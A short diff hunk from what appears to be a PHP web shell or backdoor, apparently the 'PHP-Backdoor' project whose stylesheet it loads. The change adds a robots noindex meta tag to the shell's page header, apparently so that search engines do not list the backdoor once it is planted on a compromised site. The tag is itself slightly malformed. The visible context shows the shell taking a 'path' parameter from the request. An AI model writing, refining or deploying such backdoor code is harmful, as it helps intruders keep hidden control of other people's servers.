@@ -22,7 +22,7 @@ if (get_magic_quotes_gpc()) {
     }
 }
 
-echo '<!DOCTYPE html><html><head><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="//zerobyte-id.github.io/PHP-Backdoor/inc/m1n1.css" rel="stylesheet" type="text/css"></head><body>';
+echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="//zerobyte-id.github.io/PHP-Backdoor/inc/m1n1.css" rel="stylesheet" type="text/css"></head><body>';
 
 echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
 if (isset($_GET['path'])) {
